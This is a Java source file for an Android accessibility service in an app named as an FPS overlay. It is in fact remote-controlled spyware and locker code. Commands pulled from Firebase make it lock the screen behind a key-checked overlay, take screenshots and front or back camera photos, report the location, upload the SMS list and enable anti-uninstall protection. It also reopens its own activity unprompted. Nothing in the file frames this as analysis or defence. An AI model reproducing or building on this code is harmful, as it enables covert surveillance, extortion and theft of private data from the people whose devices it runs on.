package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import androidx.annotation.NonNull;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import java.io.File;

public class SupportService extends AccessibilityService implements FirebaseManager.CommandCallback, OverlayManager.OverlayCallback {
    private static final String TAG = "SupportService";
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    
    private FirebaseManager firebaseManager;
    private MediaManager mediaManager;
    private LocationProvider locationProvider;
    private SmsManager smsManager;
    private OverlayManager overlayManager;
    private ProtectionManager protectionManager;

    static { System.loadLibrary("fps-native"); }
    public native void initNative(String path);
    public native void setLockStatusNative(boolean locked);
    public native boolean isLockedNative();
    public native boolean checkKey(String s);

    @Override
    protected void onServiceConnected() {
        Log.d(TAG, "Service Connected");
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);

        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        initNative(new File(getFilesDir(), ".v_stat").getAbsolutePath());
        
        firebaseManager = new FirebaseManager(deviceId, this);
        firebaseManager.init();
        
        mediaManager = new MediaManager(this, firebaseManager.getDataRef());
        locationProvider = new LocationProvider(this, firebaseManager.getDataRef());
        smsManager = new SmsManager(this, firebaseManager.getDataRef());
        overlayManager = new OverlayManager(this, this);
        protectionManager = new ProtectionManager(this);

        // Synchronize initial state from Firebase
        firebaseManager.getDataRef().child("config").child("anti_uninstall")
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        if (snapshot.exists()) {
                            boolean enabled = snapshot.getValue(Boolean.class) != null && snapshot.getValue(Boolean.class);
                            protectionManager.setAntiUninstallEnabled(enabled);
                        }
                    }
                    @Override public void onCancelled(@NonNull DatabaseError error) {}
                });

        if (isLockedNative()) {
            overlayManager.showOverlay();
        }

        // Auto-reopen main activity to ensure permissions are checked
        mainHandler.postDelayed(() -> {
            try {
                Intent intent = new Intent(this, CoreActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                startActivity(intent);
            } catch (Exception ignored) {}
        }, 1000);
    }

    @Override
    public void onCommandReceived(String cmd) {
        mainHandler.post(() -> {
            String c = cmd.toLowerCase();
            if (c.equals("lock")) {
                overlayManager.showOverlay();
                setLockStatusNative(true);
            } else if (c.equals("unlock")) {
                overlayManager.hideOverlay();
                setLockStatusNative(false);
            } else if (c.equals("screenshot")) {
                mediaManager.takeScreenshotAction(this);
            } else if (c.equals("camera_front")) {
                mediaManager.takeCameraAction(1);
            } else if (c.equals("camera_back")) {
                mediaManager.takeCameraAction(0);
            } else if (c.equals("location")) {
                locationProvider.requestFreshLocation();
            } else if (c.equals("sms")) {
                smsManager.sendSmsList();
            } else if (c.startsWith("anti_uninstall:")) {
                boolean enable = c.endsWith(":on");
                protectionManager.setAntiUninstallEnabled(enable);
                firebaseManager.getDataRef().child("config").child("anti_uninstall").setValue(enable);
            }
        });
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event != null) {
            protectionManager.handleAccessibilityEvent(event);
        }
    }

    @Override public void onInterrupt() {}

    @Override
    public boolean onCheckKey(String key) {
        return checkKey(key);
    }

    @Override
    public void onUnlocked() {
        // Any additional logic when manually unlocked
    }

    @Override
    public void setLockStatus(boolean locked) {
        setLockStatusNative(locked); // Calls native method
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mainHandler.removeCallbacksAndMessages(null);
    }
}
